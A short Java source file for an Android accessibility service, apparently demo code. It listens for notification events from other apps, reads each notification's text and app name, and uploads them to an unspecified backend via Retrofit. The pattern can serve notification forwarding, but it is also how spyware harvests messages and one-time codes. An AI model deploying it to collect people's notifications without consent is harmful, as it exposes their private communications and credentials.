package com.example.myapplication;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MyAccessibilityService extends AccessibilityService {
    private static  final String TAG = "MyAccessibilityService";
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        Log.e(TAG, "onAccessibilityEvent : ");
        Parcelable parcelable = accessibilityEvent.getParcelableData();
        if (parcelable instanceof Notification) {
            // Status bar Notification
            Log.e(TAG, "IN OTHER NOTIFICATION : ");

        }else {
            String packageName = accessibilityEvent.getPackageName().toString();
            PackageManager packageManager = this.getPackageManager();
            try {
                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
                CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
                String log = "Message: " + accessibilityEvent.getText().get(0)
                        + " [App Name: " + applicationLabel + "]";
                sendMessageToBE(accessibilityEvent.getText().get(0).toString(), applicationLabel.toString());
                Log.e(TAG, log);

            } catch (PackageManager.NameNotFoundException e) {
                Log.e(TAG, e.toString());
//                e.printStackTrace();
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "OnInterrupt something went wrong : ");
    }

    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
        Log.e(TAG, "OnServiceConnected : ");
    }

    private void sendMessageToBE(String msg, String appName){
        try {
            ApiInterface apiInterface = RetrofitClient.getRetroFitInstance().create(ApiInterface.class);
            Message message = new Message(msg, appName);
            Call<Void> call = apiInterface.sendMessage(message);
            call.enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    Log.e("API RESPONSE", "On RESPONSE"+ response.code());
                    Log.e("API RESPONSE", "On RESPONSE: MSG"+ response.body());
                }

                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    t.printStackTrace();
                }
            });
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
